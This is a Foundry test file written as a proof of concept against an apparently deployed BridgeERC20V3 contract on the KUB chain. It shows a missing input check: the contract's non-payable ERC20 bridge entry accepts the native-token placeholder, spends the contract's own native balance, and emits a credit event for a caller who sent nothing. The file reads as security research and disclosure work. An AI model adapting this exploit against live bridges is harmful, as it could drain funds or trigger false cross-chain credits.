// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IBridgeV3 {
    enum DEST_TOKEN_TYPE { INVALID_0, NATIVE, ERC20, NATIVE_ERC20 }
    function bridge(address token_, uint256 amount_, uint64 destChainID_, DEST_TOKEN_TYPE destTokenType_) external;
    function NATIVE_REPRESENTATION() external view returns (address);
}

/**
 * PoC — BridgeERC20V3 on KUB (chain 96), contract 0x89943b24...e753.
 *
 * The NON-payable ERC20 entry `bridge(token_, amount_, destChainID_, destTokenType_)` does NOT reject
 * token_ == NATIVE_REPRESENTATION. When called with NATIVE_REPRESENTATION, `_bridge` takes the NATIVE
 * branch and does `_transferNative(receiver, totalAmount)` from the CONTRACT's OWN balance, then emits
 * Bridge(NATIVE, msg.sender, totalAmount, ...) — i.e. it spends the contract's native and tells the
 * off-chain relayer to credit the caller on the destination chain, WITHOUT the caller sending any value.
 *
 * Precondition (stated honestly): the bridge must hold native. In production it holds 0 and has no
 * receive()/fallback(), so native can only be forced in (selfdestruct) using the caller's OWN funds
 * → no profit. This PoC demonstrates the MECHANISM / missing input validation (defense-in-depth).
 */
contract NativeViaErc20Entry is Test {
    address constant BRIDGE   = 0x89943b2499d678fb2d382C66b7BaeD00b732e753;
    address constant RECEIVER = 0xD920d9E80875dC86DFC0C913635766e0967718Cd; // distributor (per bridgeMap)
    address constant FEE_RCV  = 0x71d52f764cd5BdCA65B795E3DeEf1662a7e4a6a2;
    uint64  constant ETH      = 1;
    uint256 constant FEE      = 2 ether; // FIX fee = 2 KUB

    event Bridge(address indexed token, address indexed from, uint256 amount, uint256 indexed destChainID, IBridgeV3.DEST_TOKEN_TYPE destTokenType);

    function testNativeAcceptedByErc20Entry() public {
        vm.createSelectFork("kub");
        IBridgeV3 bridge = IBridgeV3(BRIDGE);
        address NR = bridge.NATIVE_REPRESENTATION();
        assertEq(NR, 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF);

        // Production reality: the bridge holds 0 native.
        assertEq(BRIDGE.balance, 0, "bridge should hold 0 native in production");

        // Precondition: force native into the bridge (only possible with the caller's OWN funds).
        uint256 seeded = 100 ether;
        vm.deal(BRIDGE, seeded);

        address attacker = address(0xA11CE); // an EOA (extcodesize == 0 passes !_isContract)
        uint256 amount = seeded;             // amount_ the caller claims (no value is actually sent)
        uint256 totalAmount = amount - FEE;

        uint256 recvBefore = RECEIVER.balance;
        uint256 feeBefore  = FEE_RCV.balance;

        // Expect the spurious credit event that the relayer would act on.
        vm.expectEmit(true, true, true, true, BRIDGE);
        emit Bridge(NR, attacker, totalAmount, ETH, IBridgeV3.DEST_TOKEN_TYPE.ERC20);

        vm.prank(attacker, attacker);
        // Non-payable ERC20 entry, called with NATIVE_REPRESENTATION and NO msg.value:
        bridge.bridge(NR, amount, ETH, IBridgeV3.DEST_TOKEN_TYPE.ERC20);

        // The contract's OWN native was moved out, funded by the seed (not by the caller this tx).
        assertEq(RECEIVER.balance, recvBefore + totalAmount, "receiver got totalAmount from contract funds");
        assertEq(FEE_RCV.balance,  feeBefore  + FEE,         "feeReceiver got fee from contract funds");
        assertEq(BRIDGE.balance,   0,                        "contract native fully drained");

        emit log_string("NATIVE_REPRESENTATION accepted by non-payable ERC20 entry; contract native spent; Bridge(credit) emitted for caller with zero value sent.");
    }
}
